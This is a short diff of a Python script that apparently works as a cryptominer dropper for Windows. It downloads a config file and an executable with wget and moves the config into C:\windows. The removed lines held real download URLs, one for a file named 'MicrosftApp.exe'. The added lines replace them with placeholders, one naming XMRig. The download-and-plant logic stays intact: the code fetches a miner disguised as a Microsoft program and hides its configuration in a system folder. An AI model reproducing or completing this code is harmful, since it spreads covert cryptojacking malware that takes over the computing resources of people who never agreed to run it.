@@ -9,8 +9,8 @@ import winshell
 import ctypes
 
 def exe_64():
-    dll = 'https://1fgm8rh.oloadcdn.net/dl/l/bCXRZXd-wr7nZQqM/KDtHTt-Qhdc/config.json'
-    exe = 'https://1fgm8rh.oloadcdn.net/dl/l/zd8txsOyai-amQ4h/2cEFk04n8L0/MicrosftApp.exe'
+    dll = 'link here json'
+    exe = 'link here Xmrig'
     filename = wget.download(dll)
     filename = wget.download(exe)
     os.popen("move /Y config.json C:\windows\config.json")
